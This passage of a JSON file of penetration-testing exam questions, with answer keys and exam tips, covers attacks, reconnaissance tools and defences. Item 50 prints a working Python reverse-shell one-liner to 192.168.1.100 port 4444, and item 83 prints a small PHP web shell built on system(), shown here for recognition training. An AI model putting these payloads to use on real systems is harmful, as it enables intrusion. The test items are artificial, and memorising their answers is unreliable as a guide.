                "Sending phishing emails to a large number of recipients.",
                "Compromising a website that is frequently visited by a specific target group or organization, and then using that website to deliver malware to those visitors (often through drive-by downloads).",
                "Performing a denial-of-service attack against a web server.",
                "Cracking passwords using a brute-force attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Watering hole attacks target a specific group by infecting a website they are known to frequent.  It's a targeted attack, unlike mass phishing. It's not a DoS attack or password cracking.",
            "examTip": "Watering hole = Infecting a website to target a specific group."
        },
        {
          "id": 43,
          "question": "You have successfully compromised a Linux system. Which of the following files would be MOST useful for identifying other systems on the same network?",
          "options":[
            "/etc/passwd",
            "/etc/hosts",
            "/var/log/messages",
            "/etc/shadow"
          ],
          "correctAnswerIndex": 1,
          "explanation": "The `/etc/hosts` file on a Linux system contains a static mapping of hostnames to IP addresses. While it's not a comprehensive network map, it can provide clues about other systems on the local network, especially if DNS is not consistently used. `/etc/passwd` contains user account information, `/var/log/messages` contains system logs, and `/etc/shadow` contains password hashes.",
          "examTip": "`/etc/hosts` = Static hostname-to-IP mappings (Linux)."
        },
         {
            "id": 44,
             "question": "What is 'LDAP injection'?",
             "options":[
                "A type of social engineering attack.",
                "An attack technique used to exploit web applications that construct LDAP (Lightweight Directory Access Protocol) statements based on user input. Attackers can modify LDAP statements to access or modify directory data.",
                "A method for encrypting data transmitted over a network.",
                "A way to improve network performance."
             ],
             "correctAnswerIndex": 1,
             "explanation": "LDAP injection, similar to SQL injection, targets vulnerabilities in how applications handle user input when interacting with LDAP directories. It's not a social engineering attack, an encryption method, or a performance optimization.",
             "examTip": "LDAP injection = Injecting malicious LDAP queries."
        },
        {
           "id": 45,
           "question":"Which of the following is a common technique used to discover hidden parameters or functionality in web applications?",
           "options":[
              "Shoulder surfing",
              "Using tools like Burp Suite's Intruder, Param Miner, Arjun, or manual analysis of requests, responses, and JavaScript code; also, trying common parameter names.",
              "Phishing",
              "Social Engineering"
           ],
           "correctAnswerIndex": 1,
           "explanation": "Hidden parameters are not always visible in the user interface or obvious in the source code. Specialized tools and manual testing techniques are needed to discover them. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
           "examTip": "Parameter tampering, specialized tools = Discovering hidden web app parameters."
        },
        {
            "id": 46,
             "question": "What is a common method for performing a 'denial-of-service' (DoS) attack?",
             "options":[
                "Sending phishing emails to users.",
                "Flooding a target system or network with traffic (e.g., SYN floods, UDP floods, HTTP floods), overwhelming its resources and making it unavailable to legitimate users, or exploiting vulnerabilities that cause the service to crash.",
                "Exploiting a vulnerability in a web application to inject malicious SQL code.",
                "Cracking passwords using a brute-force attack."
             ],
             "correctAnswerIndex": 1,
             "explanation": "DoS attacks aim to disrupt service availability.  Flooding is a common method, but resource exhaustion or exploiting vulnerabilities to cause crashes can also achieve a DoS. Phishing is a social engineering technique, SQL injection targets databases, and brute-force attacks target passwords.",
             "examTip": "DoS = Disrupting service availability (often by flooding or crashing)."
        },
        {
            "id": 47,
            "question":"Which of the following is the MOST critical step to take *before* beginning any active scanning or exploitation during a penetration test?",
            "options":[
              "Gathering all available hacking tools.",
              "Obtaining written authorization (scope of work, rules of engagement) from the client, clearly defining the scope, targets, and limitations of the test.",
              "Identifying all potential vulnerabilities in the target system.",
              "Developing a detailed attack plan."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Without explicit, written authorization, any active testing is illegal and unethical, regardless of your tools, vulnerability knowledge, or attack plan. The authorization defines the legal and ethical boundaries of the engagement.",
            "examTip": "Written authorization = Absolutely mandatory before *any* active testing."
        },
        {
            "id": 48,
            "question":"What is 'session fixation'?",
            "options":[
                "A type of denial-of-service attack.",
                "An attack where the attacker sets a user's session ID to a *known* value, allowing them to hijack the session when the user logs in.",
                "A method for encrypting web traffic.",
                "A type of password cracking technique."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Session fixation involves pre-determining the session ID, unlike session hijacking, which steals an *existing* session ID.  It's not a DoS attack, encryption method, or password cracking technique.",
            "examTip": "Session fixation = Pre-setting the session ID to a known value."
        },
        {
           "id": 49,
            "question":"Which of the following is a common technique used to maintain access to a compromised Windows system?",
            "options":[
                "Regularly updating the operating system.",
                "Creating a scheduled task, modifying the registry (e.g., Run keys, RunOnce keys), installing a malicious service, or using WMI event subscriptions.",
                "Using a strong, unique password for the administrator account.",
                "Enabling the Windows Firewall."
            ],
            "correctAnswerIndex": 1,
            "explanation":"Scheduled tasks, registry modifications, malicious services, and WMI event subscriptions are all common persistence mechanisms, ensuring that attacker-controlled code runs automatically, even after reboots or user logouts.  Updating the OS, using strong passwords, and enabling the firewall are *defensive* measures.",
            "examTip": "Scheduled tasks, registry keys, services, WMI = Persistence on Windows."
        },
        {
           "id": 50,
            "question": "Examine the following command:\n```bash\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.100\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\nWhat is this command MOST likely doing?",
            "options":[
               "Scanning for open ports on 192.168.1.100.",
               "Creating a reverse shell from the current system to 192.168.1.100 on port 4444.",
               "Encrypting network traffic.",
               "Installing a web server."
            ],
            "correctAnswerIndex": 1,
            "explanation": "This is a classic Python one-liner for creating a reverse shell. It uses the `socket` module to establish a connection *back* to the attacker's machine (192.168.1.100) on port 4444. It then redirects standard input, output, and error (file descriptors 0, 1, and 2) to the socket, effectively giving the attacker a shell on the compromised system. It's not a port scan, encryption, or web server installation.",
            "examTip": "Python one-liner with `socket` and `subprocess` = Often a reverse shell."
        },
        {
           "id": 51,
           "question":"Which of the following Linux commands is MOST useful for identifying the processes listening on network ports?",
           "options":[
              "ls -l",
              "netstat -tulnp (or ss -tulnp)",
              "ps aux",
              "top"
           ],
           "correctAnswerIndex": 1,
           "explanation": "`netstat -tulnp` (or the newer `ss -tulnp`) displays listening sockets (TCP and UDP), along with the process ID (PID) and program name associated with each socket. `ls -l` lists files, `ps aux` shows running processes (but not necessarily their network connections), and `top` is a dynamic process viewer.",
           "examTip": "`netstat -tulnp` or `ss -tulnp` = Show listening ports and associated processes (Linux)."
        },
        {
           "id": 52,
           "question": "What is the primary purpose of using 'virtual private networks' (VPNs) in the context of security?",
           "options":[
               "To guarantee complete anonymity online.",
                "To create a secure, encrypted tunnel for network traffic, protecting data confidentiality and integrity, especially when using untrusted networks (like public Wi-Fi).",
                "To automatically block all types of cyberattacks.",
                "To speed up internet connections."
           ],
           "correctAnswerIndex": 1,
           "explanation": "VPNs encrypt your internet traffic and route it through a server in a different location, making it harder for eavesdroppers to intercept your data. They don't guarantee *complete* anonymity, prevent *all* attacks, or necessarily speed up connections (they can sometimes slow them down due to the encryption overhead).",
           "examTip": "VPN = Encrypted tunnel for network traffic."
        },
        {
           "id": 53,
            "question":"What is 'enumeration' in the context of penetration testing?",
            "options":[
              "The process of fixing vulnerabilities in a system.",
              "The process of systematically gathering information about a target system or network, identifying potential attack vectors, such as users, groups, services, shares, and applications.",
              "The process of writing a report about the penetration test.",
              "The process of encrypting sensitive data."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Enumeration is about discovering and listing potential targets and attack vectors. It's a key part of the reconnaissance and information-gathering phase. It's not about fixing vulnerabilities, writing reports, or encrypting data.",
            "examTip": "Enumeration = Discovering and listing potential targets."
        },
         {
            "id": 54,
            "question": "Which of the following is a common technique for bypassing web application firewalls (WAFs)?",
            "options":[
               "Using strong passwords for all user accounts.",
               "Using techniques like character encoding, obfuscation, and HTTP parameter pollution to disguise malicious payloads and evade WAF detection rules.",
               "Enabling HTTPS for all web traffic.",
               "Regularly updating the web application's software."
            ],
            "correctAnswerIndex": 1,
            "explanation": "WAFs often rely on pattern matching and rules to identify malicious requests. Attackers can try to bypass these rules by encoding or obfuscating their payloads, making them look different from known attack signatures.  Strong passwords, HTTPS, and updates are important security practices, but they don't directly address WAF evasion. HTTP parameter pollution involves sending multiple parameters with the same name, which can sometimes confuse WAFs.",
            "examTip": "Encoding, obfuscation, parameter pollution = WAF evasion techniques."
        },
        {
            "id": 55,
           "question": "You are performing a penetration test against a web application and discover that session IDs are predictable and sequential. What type of attack does this vulnerability MOST directly facilitate?",
           "options":[
              "Cross-Site Scripting (XSS)",
              "Session hijacking or prediction",
              "SQL Injection (SQLi)",
              "Denial-of-Service (DoS)"
           ],
           "correctAnswerIndex": 1,
           "explanation": "Predictable session IDs allow an attacker to guess or predict valid session IDs, potentially hijacking other users' sessions. XSS involves injecting scripts, SQLi targets databases, and DoS disrupts availability. While session management weaknesses *can* be related to other vulnerabilities, predictable IDs *directly* enable hijacking/prediction.",
           "examTip": "Predictable session IDs = Session hijacking risk."
        },
        {
            "id": 56,
            "question":"What is 'privilege escalation'?",
            "options":[
                "Encrypting sensitive data on a system.",
                "The process of gaining higher-level permissions or access rights than originally granted, often by exploiting vulnerabilities or misconfigurations.",
                "Scanning a network for open ports and services.",
                "Sending phishing emails to users to obtain their credentials."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Privilege escalation is about obtaining greater access rights than intended. It's not encryption, port scanning, or phishing (though phishing could be used to *gain initial access*, which might then be followed by privilege escalation).",
            "examTip": "Privilege escalation = Gaining higher access rights."
        },
        {
            "id": 57,
            "question":"Which of the following is a common method for performing a 'distributed denial-of-service' (DDoS) attack?",
            "options":[
               "Sending phishing emails to a large number of recipients.",
               "Using a botnet (a network of compromised computers) to flood a target system or network with traffic from multiple sources simultaneously.",
               "Exploiting a vulnerability in a web application to inject malicious SQL code.",
               "Cracking passwords using a brute-force attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "DDoS attacks use *multiple* compromised systems (often forming a botnet) to amplify the attack and overwhelm the target. Phishing is social engineering, SQL injection targets databases, and brute-force attacks target passwords.",
            "examTip": "DDoS = Distributed denial-of-service (multiple sources)."
        },
        {
            "id": 58,
              "question": "What is a common technique used to identify the operating system of a remote host?",
              "options":[
                 "Shoulder surfing",
                 "OS fingerprinting using tools like Nmap (with the -O option), p0f, or analyzing network traffic characteristics.",
                 "Phishing",
                 "Social engineering"
              ],
              "correctAnswerIndex": 1,
              "explanation": "OS fingerprinting analyzes network responses (packet characteristics, TCP/IP stack behavior, etc.) to determine the operating system. Nmap's `-O` option and tools like p0f are specifically designed for this. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
              "examTip": "OS fingerprinting (Nmap -O, p0f) = Identifying remote OS."
          },
        {
           "id": 59,
           "question": "Which of the following is a common method for performing reconnaissance on a target organization during the initial stages of a penetration test?",
           "options":[
             "Exploiting vulnerabilities in the target's web server.",
             "Gathering information from publicly available sources (OSINT), such as websites, social media, search engines, DNS records, and WHOIS information.",
             "Performing a denial-of-service attack against the target's network.",
             "Cracking passwords using a brute-force attack."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Reconnaissance is about gathering information *before* attempting any attacks. OSINT (Open-Source Intelligence) techniques are crucial for this phase. Exploiting vulnerabilities, DoS attacks, and password cracking come later.",
           "examTip": "Reconnaissance = Gathering information (OSINT is key)."
        },
        {
            "id": 60,
            "question": "Analyze the following Wireshark capture filter: `tcp.port == 80 && http.request.method == \"POST\"`\nWhat type of traffic will this filter display?",
            "options":[
              "All TCP traffic.",
              "All HTTP traffic.",
              "Only HTTP GET requests on port 80.",
              "Only HTTP POST requests on port 80."
            ],
            "correctAnswerIndex": 3,
            "explanation": "This Wireshark filter combines two conditions: `tcp.port == 80` selects traffic on TCP port 80 (typically HTTP), and `http.request.method == \"POST\"` further filters for HTTP requests using the POST method.  It will *only* show HTTP POST requests on port 80. It won't show all TCP traffic, all HTTP traffic (it's limited to POST), or GET requests.",
            "examTip": "Wireshark filters combine conditions to isolate specific traffic."
        },
        {
            "id": 61,
            "question": "What is the primary difference between a 'worm' and a 'virus'?",
            "options":[
               "Worms are always more dangerous than viruses.",
               "A worm can self-replicate and spread across networks without user interaction, while a virus typically requires a user to execute an infected file or program.",
               "Viruses are always more dangerous than worms.",
               "There is no significant difference."
            ],
            "correctAnswerIndex": 1,
            "explanation": "The key distinction is in how they spread. Worms are self-replicating and can spread autonomously, often exploiting network vulnerabilities. Viruses usually require a host file or program to be executed to spread. While both *can* be dangerous, their propagation methods differ significantly. The 'more dangerous' statement depends highly on context.",
            "examTip": "Worm = Self-replicating; Virus = Requires host file/program."
        },
        {
           "id": 62,
           "question": "Which of the following is a common technique for discovering hidden files and directories on a web server?",
           "options":[
              "Shoulder surfing.",
              "Using tools like DirBuster, Gobuster, ffuf, or performing directory brute-forcing/dictionary attacks; also analyzing source code (HTML, JavaScript) and checking `robots.txt` for clues.",
              "Phishing.",
              "Social engineering."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Directory brute-forcing tools, combined with analyzing source code and checking `robots.txt`, are effective methods for finding unlinked or hidden web content. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
           "examTip": "Directory brute-forcing, source code analysis = Finding hidden web content."
        },
        {
           "id": 63,
           "question":"What is 'input validation'?",
           "options":[
             "A type of encryption used to protect data.",
             "The process of checking and sanitizing user-supplied data to ensure it conforms to expected formats and does not contain malicious code or characters.",
             "A way to improve website loading times.",
             "A method for managing user accounts and passwords."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Input validation is a critical security control to prevent injection attacks (like SQLi and XSS) by ensuring that user input is safe before it's processed by the application.  It's not encryption, a performance optimization, or user account management.",
           "examTip": "Input validation = Checking and sanitizing user input."
        },
        {
           "id": 64,
           "question": "Which of the following is a common technique used to maintain persistence on a compromised system?",
           "options":[
               "Reporting vulnerabilities to the system owner.",
               "Installing a backdoor, creating a persistent connection (e.g., reverse shell), modifying system configurations (e.g., startup scripts, registry keys), or creating a new user account with elevated privileges.",
               "Documenting the steps taken to compromise the system.",
               "Patching the vulnerabilities that were exploited."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Persistence mechanisms ensure that an attacker can regain access even after the initial exploit is discovered or the system is rebooted. Reporting vulnerabilities and documenting steps are part of ethical hacking, while patching is a defensive measure.",
           "examTip": "Backdoors, persistent connections, system modifications = Maintaining access."
        },
        {
            "id": 65,
            "question": "You have gained access to a Linux system. Which of the following commands would be MOST useful for identifying network connections and listening ports?",
            "options":[
               "ls -l",
               "netstat -tulnp (or ss -tulnp)",
               "ps aux",
               "top"
            ],
            "correctAnswerIndex": 1,
            "explanation": "`netstat -tulnp` (or the newer `ss -tulnp`) displays listening sockets (TCP and UDP), along with the process ID (PID) and program name associated with each socket. This is crucial for understanding what services are running and exposed on the network. `ls -l` lists files, `ps aux` shows running processes (but not necessarily their network connections), and `top` is a dynamic process viewer.",
            "examTip": "`netstat -tulnp` or `ss -tulnp` = Show listening ports and associated processes (Linux)."
        },
        {
            "id": 66,
            "question":"What is 'DLL hijacking'?",
            "options":[
               "A type of social engineering attack.",
               "An attack where a malicious DLL (Dynamic Link Library) file is placed in a location where it will be loaded by a legitimate application, allowing the attacker's code to execute with the privileges of that application.",
               "A method for encrypting data stored on a hard drive.",
               "A way to improve system performance."
            ],
            "correctAnswerIndex": 1,
            "explanation": "DLL hijacking exploits the way Windows applications load DLLs. By placing a malicious DLL in a specific location (often exploiting search order vulnerabilities), the attacker can trick a legitimate application into loading and executing their code. It's not a social engineering attack, encryption method, or performance improvement technique.",
            "examTip": "DLL hijacking = Tricking an application into loading a malicious DLL."
        },
        {
            "id": 67,
            "question": "Which of the following is a common technique used to discover subdomains of a target domain?",
            "options":[
              "Shoulder surfing.",
              "Using tools like Sublist3r, Amass, subfinder, or performing DNS reconnaissance (e.g., zone transfer attempts, brute-forcing common subdomain names); also, searching public certificate transparency logs.",
              "Phishing.",
              "Social Engineering"
            ],
            "correctAnswerIndex": 1,
            "explanation": "Subdomain enumeration tools, DNS reconnaissance, and searching certificate transparency logs are all effective methods for finding subdomains that might not be easily discoverable otherwise. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
            "examTip": "Subdomain enumeration tools, DNS reconnaissance, certificate transparency logs = Finding subdomains."
        },
        {
            "id": 68,
             "question": "Examine the following Nmap command and its (partial) output:\nCommand: `nmap -sC -sV 192.168.1.100`\nPartial Output:\n```\nPORT     STATE SERVICE       VERSION\n22/tcp   open  ssh           OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 c4:68:1f:d7:44:56:cf:77:2b:1e:43:99:8f:8f:67:65 (RSA)\n|   256 99:83:7c:06:92:74:89:7f:d4:23:91:61:80:48:7d:49 (ECDSA)\n|_  256 77:2c:7b:8b:c1:56:57:26:7e:5a:b8:08:a1:d9:93:68 (ED25519)\n80/tcp   open  http          Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)\n|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16\n...\n```\nWhat is the purpose of the `-sC` option in this Nmap command?",
             "options":[
                "It performs a stealth scan.",
                "It runs Nmap's default set of scripts, which are considered safe and generally useful for service detection and information gathering.",
                "It performs OS detection.",
                "It scans only UDP ports."
             ],
             "correctAnswerIndex": 1,
             "explanation": "The `-sC` option (equivalent to `--script=default`) in Nmap runs a set of default scripts that are considered safe and non-intrusive. These scripts often provide additional information about the services discovered, such as banner grabbing, retrieving HTTP titles, and sometimes even identifying potential vulnerabilities. It's not a general stealth scan (though some of the default scripts might be stealthy), OS detection (`-O`), or UDP scanning (`-sU`).  In this specific output, we see the results of scripts like `ssh-hostkey` and `http-server-header`.",
             "examTip": "Nmap `-sC` = Run default (safe) scripts."
        },
        {
            "id": 69,
            "question": "What is the primary purpose of using a 'Web Application Firewall' (WAF) in front of a web application?",
            "options":[
              "To encrypt all data stored on the web server.",
              "To filter, monitor, and block malicious HTTP/HTTPS traffic to and from the web application, providing a layer of defense against common web attacks like SQL injection, XSS, and others.",
              "To manage user accounts and permissions on the web server.",
              "To improve the performance and speed of the website."
            ],
            "correctAnswerIndex": 1,
            "explanation": "A WAF acts as a security guard, analyzing web traffic and blocking malicious requests based on predefined rules and signatures. It's not primarily for data encryption (though it may handle SSL/TLS termination), user management, or performance optimization (though it can sometimes improve performance by caching).",
            "examTip": "WAF = Web application protection (filtering malicious traffic)."
        },
        {
          "id": 70,
          "question":"Which of the following is a common technique used to bypass Network Access Control (NAC) systems?",
          "options":[
            "Using strong passwords for all user accounts.",
            "MAC spoofing, 802.1X authentication bypass (if vulnerabilities exist), or exploiting vulnerabilities in the NAC system itself.",
            "Enabling two-factor authentication for all user accounts.",
            "Regularly updating software on all network devices."
          ],
          "correctAnswerIndex": 1,
          "explanation": "MAC spoofing (changing a device's MAC address to match an authorized one), exploiting 802.1X vulnerabilities, or directly attacking the NAC system are methods for bypassing NAC. Strong passwords and 2FA are good security practices, but they don't directly address NAC bypass. Updates are crucial for overall security but don't prevent *bypassing* NAC.",
          "examTip": "MAC spoofing, 802.1X bypass, NAC exploits = Bypassing NAC."
        },
        {
            "id": 71,
             "question": "You are performing a penetration test and discover a web application that allows you to upload files with arbitrary extensions. You successfully upload a file named `shell.asp` and can then execute it by accessing it through a URL. What type of vulnerability have you exploited, and what is the MOST severe potential consequence?",
             "options":[
                "Cross-Site Scripting (XSS); you can inject malicious scripts into web pages viewed by other users.",
                "Unrestricted File Upload leading to Remote Code Execution (RCE); you can execute arbitrary commands on the web server.",
                "SQL Injection (SQLi); you can gain access to the web server's database.",
                "Denial-of-Service (DoS); you can make the web application unavailable to legitimate users."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Uploading and executing a server-side script (like an ASP file) is a classic example of Remote Code Execution (RCE) through an unrestricted file upload vulnerability. This is a very critical vulnerability, as it allows the attacker to run arbitrary commands on the server. XSS involves client-side script injection, SQLi targets databases, and DoS disrupts service.",
             "examTip": "Unrestricted file upload + server-side code execution (e.g., .asp, .php, .jsp) = RCE."
        },
        {
           "id": 72,
           "question":"What is 'cross-site request forgery' (CSRF)?",
           "options":[
                "A type of denial-of-service attack that makes a web server unavailable.",
                "An attack that forces an authenticated end user to execute unwanted actions on a web application in which they are currently logged in, without their knowledge or consent.",
                "A method for encrypting data transmitted between a web browser and a web server.",
                "A technique for cracking passwords using a brute-force attack."
           ],
           "correctAnswerIndex": 1,
           "explanation": "CSRF exploits the trust a web application has in a user's browser, tricking the browser into sending requests that the user didn't intend, but which the application treats as legitimate because the user is already authenticated. It's not a DoS attack, encryption method, or password cracking technique.",
           "examTip": "CSRF = Forcing unintended user actions on a web application."
        },
        {
          "id": 73,
          "question": "Which of the following is a common method for gathering information about a target organization during the reconnaissance phase of a penetration test?",
          "options":[
            "Exploiting vulnerabilities in the target's web server.",
            "Using OSINT (Open-Source Intelligence) techniques, such as searching public websites, social media, search engines, DNS records, WHOIS information, and other publicly available data sources.",
            "Performing a denial-of-service attack against the target's network.",
            "Cracking passwords using a brute-force or dictionary attack."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Reconnaissance is about gathering information *before* launching any attacks. OSINT is a crucial part of this phase, leveraging publicly available data. Exploiting vulnerabilities, DoS attacks, and password cracking are later stages in an attack.",
          "examTip": "Reconnaissance = Gathering information (OSINT is key)."
        },
        {
           "id": 74,
           "question": "What is a common technique for identifying the operating system and services running on a remote host?",
           "options":[
               "Shoulder surfing.",
               "Using Nmap with options like `-O` (OS detection) and `-sV` (service version detection), p0f, or other specialized fingerprinting tools; also, analyzing network traffic and service banners.",
               "Phishing.",
               "Social Engineering."
           ],
           "correctAnswerIndex": 1,
           "explanation": "OS and service fingerprinting involves analyzing network responses and service banners to determine the OS and running services. Nmap's `-O` and `-sV` options, along with tools like p0f, are specifically designed for this. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack techniques.",
           "examTip": "OS and service fingerprinting (Nmap -O, -sV, p0f) = Identifying remote OS and services."
        },
        {
             "id": 75,
             "question":"Which of the following is a common technique used to prevent 'SQL injection' attacks?",
             "options":[
                "Using weak passwords for database accounts.",
                "Using parameterized queries (prepared statements) or employing proper input validation and output encoding, and following the principle of least privilege for database access.",
                "Disabling firewalls to allow all network traffic.",
                "Ignoring user input and assuming it is safe."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Parameterized queries (prepared statements) are the most robust defense against SQL injection. They treat user input as *data*, not as executable SQL code. Input validation and output encoding are also important, as is limiting database user privileges (least privilege). Weak passwords, disabling firewalls, and ignoring input are all security risks.",
             "examTip": "Parameterized queries (prepared statements) = Primary defense against SQL injection."
        },
         {
            "id": 76,
            "question": "You are performing a penetration test and discover a web application that is vulnerable to Cross-Site Scripting (XSS). Which of the following actions would be the MOST appropriate and ethical response, according to standard penetration testing practices?",
            "options":[
              "Immediately exploit the vulnerability to steal user cookies and session data.",
              "Report the vulnerability to the client, providing detailed information on how to reproduce the issue, the potential impact, and recommendations for remediation (e.g., input validation, output encoding).",
              "Post the vulnerability details on a public forum or website without notifying the client.",
              "Ignore the vulnerability because XSS is not considered a serious security risk."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Ethical hacking requires responsible disclosure. Reporting the vulnerability to the client, with details on how to reproduce it and fix it, is the correct approach. Stealing cookies is illegal and unethical, public disclosure without consent is irresponsible, and XSS *is* a serious security risk.",
            "examTip": "Report vulnerabilities responsibly to the client."
        },
        {
          "id": 77,
            "question": "What is the primary purpose of a 'honeypot' in network security?",
            "options":[
               "To store highly sensitive data in a secure location.",
               "To act as a decoy system, designed to attract and detect attackers, providing early warning of attacks, insights into their methods, and potentially diverting them from real targets.",
               "To encrypt all network traffic between a client and a server.",
               "To manage user accounts and permissions on a network."
            ],
            "correctAnswerIndex": 1,
            "explanation": "A honeypot is a deliberately vulnerable system designed to lure attackers and study their behavior. It's not for storing sensitive data, encrypting traffic, or managing user accounts.",
            "examTip": "Honeypot = Decoy system to attract and study attackers."
        },
        {
             "id": 78,
             "question": "What is a common technique for maintaining persistence on a compromised Linux system?",
             "options":[
                "Using strong passwords for all user accounts.",
                "Modifying system startup scripts (e.g., in /etc/init.d/, systemd units, or rc.local), creating cron jobs, adding a user with sudo privileges, or installing a rootkit.",
                "Enabling a firewall to block unauthorized network connections.",
                "Regularly updating the operating system and all installed software."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Persistence mechanisms allow an attacker to regain access even after reboots or user logouts. Modifying system startup scripts, creating cron jobs (scheduled tasks), adding a privileged user, or installing a rootkit are common techniques. Strong passwords, firewalls, and updates are *defensive* measures.",
             "examTip": "Startup scripts, cron jobs, rootkits, user accounts = Persistence on Linux."

        },
        {
             "id": 79,
            "question": "Which of the following is a common technique used to escalate privileges on a Windows system after gaining initial access?",
            "options":[
                "Phishing email campaigns.",
                "Exploiting vulnerabilities in unpatched software or misconfigured services, leveraging tools like Mimikatz to extract credentials, or using token impersonation techniques.",
                "Social engineering attacks.",
                "Shoulder surfing."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Privilege escalation on Windows often involves exploiting vulnerabilities (especially in unpatched systems or misconfigured services), extracting credentials (using tools like Mimikatz), or using token impersonation. Phishing and social engineering are typically used for *initial access*, not privilege escalation. Shoulder surfing is an information-gathering technique.",
            "examTip": "Vulnerability exploitation, credential theft (Mimikatz), token impersonation = Windows privilege escalation."
        },
        {
            "id": 80,
            "question": "Analyze the following Apache web server log snippet:\n```\n192.168.1.100 - - [28/Aug/2024:14:32:15 -0400] \"GET /admin.php HTTP/1.1\" 404 208 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n192.168.1.100 - - [28/Aug/2024:14:32:16 -0400] \"GET /administrator/login.php HTTP/1.1\" 404 215 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n192.168.1.100 - - [28/Aug/2024:14:32:17 -0400] \"GET /admin/login.html HTTP/1.1\" 404 212 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n192.168.1.100 - - [28/Aug/2024:14:32:18 -0400] \"GET /login.php HTTP/1.1\" 200 1532 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n```\nWhat can you infer about the actions of the user with IP address 192.168.1.100 based on this log snippet?",
            "options":[
               "The user successfully logged in to the web application.",
               "The user was attempting to brute-force a login page.",
               "The user was likely probing for common administrative login page paths.",
               "The user was performing a SQL injection attack."
            ],
            "correctAnswerIndex": 2,
            "explanation": "The log shows multiple 404 (Not Found) errors for requests to paths like `/admin.php`, `/administrator/login.php`, and `/admin/login.html`. This suggests the user was trying different common paths for administrative login pages. Eventually, the user finds a page that returns a 200 OK status code, indicating a potentially successful page load. While we don't see a login *attempt* (which would usually be a POST request), the pattern strongly suggests reconnaissance for login pages.  It's not necessarily a brute-force attack (we don't see repeated attempts to the *same* page with different credentials), and there's no evidence of SQL injection in these requests.",
            "examTip": "Multiple 404 errors on common admin paths = Reconnaissance for login pages."
        },
         {
             "id": 81,
            "question": "Which of the following is a common technique for evading detection by network intrusion detection systems (NIDS) and intrusion prevention systems (IPS)?",
            "options":[
               "Using well-known attack signatures and patterns.",
                "Using techniques like packet fragmentation, IP address spoofing, traffic obfuscation (e.g., encoding, encryption), and using non-standard ports or protocols.",
                "Sending large, unfragmented packets with cleartext payloads.",
                "Using default NIDS/IPS configuration settings."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Evasion techniques aim to make malicious traffic look different from known attack patterns or to bypass filtering rules. Fragmentation, spoofing, obfuscation, and non-standard ports/protocols can help achieve this. Using well-known signatures, large unfragmented packets, and default settings would likely *trigger* the NIDS/IPS.",
            "examTip": "Fragmentation, spoofing, obfuscation, non-standard ports/protocols = NIDS/IPS evasion."
        },
        {
           "id": 82,
            "question":"What is 'DLL injection'?",
            "options":[
               "A type of social engineering attack.",
               "A technique where an attacker forces a running process to load a malicious DLL (Dynamic Link Library), allowing the attacker's code to execute within the context of that process.",
               "A method for encrypting data stored on a hard drive.",
               "A way to improve system performance."
            ],
            "correctAnswerIndex": 1,
            "explanation":"DLL injection is a code injection technique that exploits the way Windows applications load DLLs. By forcing a legitimate process to load a malicious DLL, the attacker can execute arbitrary code with the privileges of that process. It's not a social engineering attack, encryption method, or performance improvement technique.",
            "examTip": "DLL injection = Forcing a process to load a malicious DLL."
        },
        {
           "id": 83,
          "question": "You are analyzing a compromised web server and discover a suspicious PHP file with the following content:\n```php\n<?php\n  if(isset($_REQUEST['cmd'])){\n    system($_REQUEST['cmd']);\n  }\n?>\n```\nWhat type of vulnerability does this code represent, and how could it be exploited?",
          "options":[
              "Cross-Site Scripting (XSS); it can be exploited by injecting JavaScript code into the 'cmd' parameter.",
              "Remote Code Execution (RCE); it can be exploited by sending a request with a 'cmd' parameter containing operating system commands.",
              "SQL Injection (SQLi); it can be exploited by injecting SQL code into the 'cmd' parameter.",
              "Cross-Site Request Forgery (CSRF); it can be exploited by tricking a user into submitting a malicious request."
          ],
          "correctAnswerIndex": 1,
          "explanation": "This PHP code snippet is a classic example of a web shell, providing Remote Code Execution (RCE) capabilities. The `system()` function executes operating system commands passed to it via the `$_REQUEST['cmd']` parameter. An attacker could exploit this by sending a request like `http://example.com/vulnerable.php?cmd=whoami` to execute the `whoami` command on the server. It's not XSS (which involves client-side script injection), SQLi (which targets databases), or CSRF (which forces unintended user actions).",
          "examTip": "Web shell (e.g., PHP `system()` with user input) = Remote Code Execution (RCE)."
        },
        {
          "id": 84,
            "question":"What is the purpose of 'threat modeling' in the context of application security?",
            "options":[
                "To exploit vulnerabilities in a web application.",
